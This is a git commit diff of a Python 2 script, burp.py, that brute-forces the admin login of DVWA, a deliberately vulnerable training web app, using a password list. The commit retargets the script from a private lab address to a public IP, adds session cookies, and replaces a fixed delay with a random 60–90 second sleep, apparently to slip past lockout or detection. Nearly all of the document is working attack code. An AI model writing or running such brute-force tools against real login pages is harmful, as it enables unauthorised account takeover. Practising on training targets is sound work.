b3cd3949a73629b5474cb9a6ea7c9a19be121d11
bc-w <46521465+bc-w@users.noreply.github.com>
2020-05-19 09:57:44 +0800

    Add files via upload

--- burp.py
+++ burp.py
@@ -2,17 +2,18 @@ from bs4 import BeautifulSoup
 import urllib2
 import os
 import time
-header={'Host': '192.168.137.128',
+import random
+header={'Host': '161.189.169.253:8180',
 		'Cache-Control': 'max-age=0',
 		'If-None-Match': "307-52156c6a290c0",
 		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
 		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
 		'Accept': '*/*',
-		'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute',
+		'Referer': 'http://161.189.169.253:8180/DVWA-master/vulnerabilities/brute/?username=admin&password=password&Login=Login',
 		'Accept-Encoding': 'gzip, deflate, sdch',
 		'Accept-Language': 'zh-CN,zh;q=0.8',
-		'Cookie': 'security=low; PHPSESSID=2fa9ovflih6r0oe7s0a8or9392'}
-requrl = "http://192.168.137.128/dvwa/vulnerabilities/brute/"
+		'Cookie': 'security=low; cookiesession1=1D217F9BIDVFR2LT4LD7CDIEYPWV7493; PHPSESSID=e42110ea2fdbaab1ddb70dfc92058c79'}
+requrl = "http://161.189.169.253:8180/DVWA-master/vulnerabilities/brute/"
 
 
 #def get_token(requrl,header):
@@ -33,8 +34,9 @@ def get_code(requrl,header):
 #user_token = get_token(requrl,header)
 i=0
 for line in open("password.txt"):
-	requrl = "http://192.168.137.128/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login"
-	time.sleep(20)
+	requrl = "http://161.189.169.253:8180/DVWA-master/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login"
+	rt = random.randint(60,90)
+	time.sleep(rt)
 	i = i+1
 	print i,'admin',line.strip(),
 	code = get_code(requrl,header)
